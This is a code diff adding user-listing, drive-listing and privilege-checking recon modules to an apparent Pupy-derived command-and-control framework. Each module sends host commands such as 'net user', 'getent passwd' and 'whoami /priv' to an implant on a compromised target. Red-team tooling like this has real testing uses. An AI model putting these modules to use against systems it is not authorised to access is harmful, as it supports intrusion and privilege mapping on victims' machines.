@@ -921,3 +921,120 @@ class CheckVmModule(PupyModule):
             if extra in reply:
                 result[extra] = reply[extra]
         return result
+
+
+# ── Shell-dispatched recon primitives ────────────────────────────────
+#
+# These upstream Pupy modules (users, drives, getprivs, ...) were built on
+# Pupy's agent-side remote-module injection (pupyps, pupwinutils, ...). Rather
+# than ship that package tree, Pupyteer reimplements them as native shell
+# dispatchers: the implant already answers arbitrary commands through the
+# session manager's command queue, so each module just queues the host's own
+# tool and surfaces its output. Same shape as ShellExecModule; no agent change.
+
+
+class UsersModule(PupyModule):
+    """List interactive user accounts on the target.
+
+    Upstream Pupy's ``users`` (via pupyutils.users). Native reimplementation
+    using the host's own account database.
+    """
+
+    name = "users"
+    version = "1.0.0"
+    description = "List user accounts on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.RECON
+
+    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
+        session_mgr = getattr(self, "_session_manager", None)
+        os_name = getattr(session, "os", "").lower()
+
+        if "win" in os_name:
+            cmd = "net user"
+        elif "darwin" in os_name or "mac" in os_name:
+            cmd = "dscl . list /Users"
+        else:
+            cmd = "getent passwd | cut -d: -f1"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+
+class DrivesModule(PupyModule):
+    """List mounted drives / filesystems on the target.
+
+    Upstream Pupy's ``drives`` (via psutil / pupyps). Native reimplementation
+    using the host's own tools.
+    """
+
+    name = "drives"
+    version = "1.0.0"
+    description = "List mounted drives and filesystems on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.RECON
+
+    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
+        session_mgr = getattr(self, "_session_manager", None)
+        os_name = getattr(session, "os", "").lower()
+
+        if "win" in os_name:
+            cmd = "wmic logicaldisk get name,description,freespace,size"
+        else:
+            cmd = "df -h"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+
+class GetprivsModule(PupyModule):
+    """Show the current process privileges on the target.
+
+    Upstream Pupy's ``getprivs`` (via pupwinutils.security). Native
+    reimplementation using the host's own tooling.
+    """
+
+    name = "getprivs"
+    version = "1.0.0"
+    description = "Show current process privileges on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.RECON
+
+    async def execute(self, session: Any, args: Dict[str, Any]) -> Dict[str, Any]:
+        session_mgr = getattr(self, "_session_manager", None)
+        os_name = getattr(session, "os", "").lower()
+
+        if "win" in os_name:
+            cmd = "whoami /priv"
+        else:
+            cmd = "id"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
